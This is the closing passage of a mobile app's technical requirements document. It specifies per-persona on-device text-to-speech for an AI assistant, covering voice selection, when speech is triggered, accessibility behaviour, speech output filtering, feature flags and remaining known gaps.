| cat | `com.apple.voice.enhanced.en-GB.Serena` → `Moira` → default female en-GB | default female | 0.9 | 0.85 | Deliberate, dry, precise |
| dog | `com.apple.voice.enhanced.en-AU.Karen` → any bright female | default bright | 1.25 | 1.3 | Excitable, fast, uplifted |

**Resolution strategy** (`speakAsPersona.ts` on RN):

```
1. Call Speech.getAvailableVoicesAsync() once on app start, cache in MMKV (invalidate when OS version changes).
2. For the active persona, walk the preferred list top→down.
3. Pick the first voice whose `identifier` matches OR whose `(language, quality)` matches the target.
4. Fallback: any voice with matching `language` starting with 'en'.
5. Ultimate fallback: platform default voice. Always provide rate + pitch to override.
6. Apply per-persona SSML-style trick: for DOG, append an extra space before exclamations to get a slight lift; for CAT, insert `...` before asides to get the deliberate pause. (SSML is partially honored on Android; iOS honors punctuation pauses.)
```

**When TTS speaks.** Three triggers:

1. **Explicit tap-to-play.** Every assistant chat bubble has a small speaker icon; tap → speak the message body (markdown stripped) in the current persona voice. If a new message arrives mid-playback, do not auto-interrupt; queue or drop per setting.
2. **Voice-mode toggle** (Settings → "Read AI replies aloud"). When ON, the client auto-speaks each completed assistant message as SSE `done` arrives. Silent in chat sheet when screen is locked.
3. **Greeting on Assistant Home** (opt-in, default OFF). Speak the greeting row once per app foreground if a new "daily top priority" card appeared. Requires ambient-speech consent screen in Settings.

**Accessibility interaction:**
- VoiceOver handles its own TTS; when VoiceOver is running, `speakAsPersona` no-ops (to avoid double-speech). Detected via `AccessibilityInfo.isScreenReaderEnabled`.
- For Reduce Motion users, no additional effect — TTS is independent.
- User can cancel playback with `Speech.stop()` via a visible "Stop" control that replaces the speaker icon mid-playback.

**Safety / quality guardrails:**
- Strip code fences, URLs, long numeric sequences, and markdown before speaking. Replace citation chips `[report • p.15]` with `, citing page 15,`.
- Max utterance length 600 characters; longer responses are truncated with `"…tap to read more"` suffix (visual only, not spoken).
- Haptic tick at start of each utterance (`haptic_hint` from manifest maps to `Haptics.ImpactFeedbackStyle.Soft|Light|Rigid`).

**Feature flags (added):**

| Key | Default | Purpose |
|---|---|---|
| `ai_housekeeper_voice_enabled` | `"true"` | Master gate for TTS per-persona playback |
| `ai_housekeeper_voice_auto_speak` | `"false"` | Whether "Read aloud" toggle defaults ON for new users |

**Cost / latency.** Zero — on-device synthesis. Typical speak-start latency 80–200 ms on modern devices. No network call.

**Known gap → closed.** G26 "Per-persona TTS voice matching — v2.0" is removed; promoted into v1.0 scope via this section.

### 25.11 Accessibility

- Avatar image has `accessibilityLabel` = the persona's `label`.
- Each persona card in the picker is a `button` role with `accessibilityHint` = tagline.
- The preview phrase is announced via `AccessibilityInfo.announceForAccessibility` rather than visual-only.
- Tone never overrides semantic content — VoiceOver reads the same literal message; the tone is in word choice, not emoji density.

### 25.12 Known Gaps (persona-specific)

- **G25** (new) — user-authored persona voice. Deferred to v1.1. Admin approval required if shipped.
- ~~**G26** — persona TTS voice matching. v2.0.~~ **Promoted to v1.0 scope in §25.10a.**
- **G27** (new) — per-persona avatar animations (e.g. cat tail twitch). v1.1.

---

**End of TRD v1.3.**
